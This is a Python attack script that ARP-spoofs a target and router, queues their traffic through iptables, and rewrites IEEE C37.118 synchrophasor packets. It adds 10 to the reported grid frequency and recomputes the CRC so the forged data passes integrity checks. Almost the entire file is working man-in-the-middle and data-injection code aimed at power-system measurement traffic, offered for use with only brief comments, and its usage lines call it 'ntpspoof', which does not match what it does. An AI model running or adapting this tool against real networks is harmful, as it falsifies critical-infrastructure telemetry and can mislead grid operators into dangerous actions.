'''
This code is a modified version from https://gist.github.com/0x6d69636b/0c79bb3b5bcf03d8c6e9cae3a0891a97
'''

#!/usr/bin/python3

'''
Requirements (Debian)
sudo apt install dsniff libnetfilter-queue-dev
sudo apt install netfilterqueue 
'''

import os
import subprocess
import sys
import time
from subprocess import Popen, DEVNULL
import datetime
from scapy.all import IP, TCP, Raw, checksum, send
from netfilterqueue import NetfilterQueue
import struct
import crcmod

def modify_frequency(freq):
    modified_freq = freq + 10
    packed = struct.pack('>f', modified_freq)
    return packed

def manipulate(netpackage):
    pkg = IP(netpackage.get_payload())
    tcp = pkg.getlayer(TCP)

    #Python does not have a module for reviewing synchrophasor data (that I could find), so we have to use the "Raw" part of the TCP load.
    if TCP in pkg and pkg.haslayer(Raw):
        raw = pkg[TCP].load
        print("Old Load:", raw)
        if len(raw) > 68 and len(raw) < 90:
            print('')
            #Due to the the consistent structure of synchrophasor packets, the frequency should always be at these bytes places. 
            freq = struct.unpack('>f', raw[64:68])[0]
            print("Frequency:", freq)

            new_freq = modify_frequency(freq)
            modified_raw = raw[:64] + new_freq + raw[68:]

            chk = struct.unpack('>H', modified_raw[-2:])[0]
            #print("Old checksum:", chk)
            crc16 = crcmod.mkCrcFun(0x11021, rev=False, initCrc=0xFFFF, xorOut=0x0000)
            c37_checksum = crc16(modified_raw[:-2])
            packed_chk = struct.pack('>H', c37_checksum)
            modified_raw = modified_raw[:-2]
            modified_raw = modified_raw + packed_chk
            print("New Load:", modified_raw)
            pkg[TCP].load = modified_raw
            del pkg[IP].chksum
            del pkg[TCP].chksum
            netpackage.set_payload(bytes(pkg))
            print("Modified!")
    netpackage.accept()


if __name__ == '__main__':
    print("running")
    if os.geteuid() != 0:
        print('You have to run the script as root')
        exit(1)

    if len(sys.argv) < 2:
        print('Usage: ntpspoof <target_ip> <net interface (Optional)>')
        print('Example: ntpspoof 192.168.2.99 eth0')
        exit(1)

    if len(sys.argv) < 3:
        print('No network interface specified. Using \'eth0\'')
        iface = 'eth0'
    else:
        iface = sys.argv[2]

    # calculate IP addresses
    ip_addr = sys.argv[1]
    # Change depending on your router IP
    router_ip = '192.168.0.102'

    print('Running ARP spoofing for target:', ip_addr,
          'using the router:', router_ip)
    p = Popen(['arpspoof', '-i', iface, '-t', router_ip, ip_addr],
              stderr=DEVNULL, stdout=DEVNULL)
    q = Popen(['arpspoof', '-i', iface, '-t', ip_addr, router_ip],
   	      stderr=DEVNULL, stdout=DEVNULL)

    # run iptables
    with open('/proc/sys/net/ipv4/ip_forward', 'w') as f:
        print('1\n', file=f)
    os.system('iptables -t raw -A PREROUTING -p tcp -d'
		+ router_ip + ' --sport 4712 -j NFQUEUE --queue-num 99')

    nfqueue = NetfilterQueue()
    # 99 is the iptabels rule queue number, modify is the callback function
    nfqueue.bind(99, manipulate)
    try:
        print("[*] waiting for TCP packages")
        nfqueue.run()
    except KeyboardInterrupt:
        pass
    finally:
        nfqueue.unbind()
        p.terminate()
        os.system('iptables -F -vt raw')

